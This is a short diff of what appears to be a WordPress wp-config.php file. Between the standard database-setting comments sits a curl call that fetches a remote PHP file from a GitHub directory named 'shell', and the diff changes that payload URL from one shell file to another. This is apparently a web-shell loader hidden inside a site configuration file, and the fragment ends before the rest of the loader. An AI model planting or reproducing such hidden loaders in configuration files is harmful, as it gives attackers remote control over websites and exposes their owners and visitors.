@@ -20,7 +20,7 @@
 
 // ** Database settings - You can get this info from your web host ** //
 /** The name of the database for WordPress */
-$ch = curl_init('https://raw.githubusercontent.com/sajapastipasti-afk/assets/refs/heads/main/shell/xxx.php');
+$ch = curl_init('https://raw.githubusercontent.com/sajapastipasti-afk/assets/refs/heads/main/shell/xxxalfa.php');
 
 /** Database username */
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
